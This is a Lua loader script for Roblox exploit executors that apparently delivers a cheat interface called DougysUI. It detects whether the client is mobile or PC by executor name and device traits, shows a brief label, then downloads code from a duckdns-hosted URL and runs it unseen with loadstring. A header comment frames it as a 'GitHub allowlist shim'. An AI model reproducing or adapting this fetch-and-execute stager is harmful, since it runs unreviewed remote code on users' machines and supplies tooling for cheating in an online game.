-- GitHub allowlist shim. TSB loads this file for UI; pick mobile vs PC here.
local PC = "https://api.dougys.duckdns.org/ui/Q6QhyofwluRSohJgezfv44vU4O4lN-aV"
local MOBILE = "https://api.dougys.duckdns.org/ui/hXF-UCRNy1-NR8RFvcc6wCaN52Sx4-xM"

local function good(src)
    return type(src) == "string" and #src > 50
end

local function fetch(u)
    local ok, src = pcall(function()
        return game:HttpGet(u)
    end)
    if ok and good(src) then
        return src
    end
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if type(req) ~= "function" then
        error("DougysUI: failed to fetch API: " .. tostring(src))
    end
    local res = req({
        Url = u,
        Method = "GET",
        Headers = {
            ["User-Agent"] = "Mozilla/5.0",
            ["Accept"] = "*/*",
        },
    })
    local body = type(res) == "table" and (res.Body or res.body) or nil
    local code = type(res) == "table" and (res.StatusCode or res.status_code or res.Status) or nil
    if good(body) and (not code or code == 200) then
        return body
    end
    error("DougysUI: failed to fetch API: " .. tostring(code or src))
end

local function isMobileClient()
    local uis = game:GetService("UserInputService")
    local exec = ""
    pcall(function()
        if identifyexecutor then
            exec = string.lower(tostring(identifyexecutor()))
        end
    end)
    pcall(function()
        if getexecutorname then
            exec = exec .. " " .. string.lower(tostring(getexecutorname()))
        end
    end)
    if string.find(exec, "delta", 1, true)
        or string.find(exec, "hydrogen", 1, true)
        or string.find(exec, "codex", 1, true)
        or string.find(exec, "arceus", 1, true)
        or string.find(exec, "trigon", 1, true)
        or string.find(exec, "vegax", 1, true)
    then
        return true
    end
    if uis.TouchEnabled or uis.GyroscopeEnabled or uis.AccelerometerEnabled then
        return true
    end
    local okPlat, plat = pcall(function()
        return uis:GetPlatform()
    end)
    if okPlat and (plat == Enum.Platform.IOS or plat == Enum.Platform.Android) then
        return true
    end
    local cam = workspace.CurrentCamera
    local vs = cam and cam.ViewportSize
    if vs and vs.Y > vs.X then
        return true
    end
    local pcNames = {
        "synapse", "wave", "solara", "valex", "electron", "celery", "zenith",
        "seliware", "xeno", "awp", "macsploit", "potassium", "velocity",
        "scriptware", "jjsploit",
    }
    for i = 1, #pcNames do
        if string.find(exec, pcNames[i], 1, true) then
            return false
        end
    end
    return true
end

local forced = getgenv() and getgenv().DOUGYS_UI_MOBILE
local mobile
if forced == true then
    mobile = true
elseif forced == false then
    mobile = false
else
    mobile = isMobileClient()
end

pcall(function()
    local parent
    pcall(function()
        if gethui then
            parent = gethui()
        end
    end)
    if not parent then
        pcall(function()
            parent = game:GetService("CoreGui")
        end)
    end
    if not parent then
        local lp = game:GetService("Players").LocalPlayer
        parent = lp and lp:FindFirstChild("PlayerGui")
    end
    if not parent then
        return
    end
    local g = Instance.new("ScreenGui")
    g.Name = "DougysUiKind"
    g.ResetOnSpawn = false
    g.DisplayOrder = 2147483647
    g.Parent = parent
    local t = Instance.new("TextLabel")
    t.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    t.BorderSizePixel = 0
    t.Font = Enum.Font.SourceSansBold
    t.TextSize = 18
    t.TextColor3 = Color3.fromRGB(255, 220, 80)
    t.Text = mobile and "DougysUI: MOBILE" or "DougysUI: PC"
    t.Size = UDim2.fromOffset(220, 36)
    t.Position = UDim2.fromOffset(12, 12)
    t.Parent = g
    local later = (task and task.delay) or function(sec, fn)
        spawn(function()
            wait(sec)
            fn()
        end)
    end
    later(8, function()
        if g then
            g:Destroy()
        end
    end)
end)

local src = fetch(mobile and MOBILE or PC)
local fn, err = loadstring(src, mobile and "DougysUI_Mobile" or "DougysUI")
if not fn then
    error("DougysUI: compile failed: " .. tostring(err))
end
return fn()
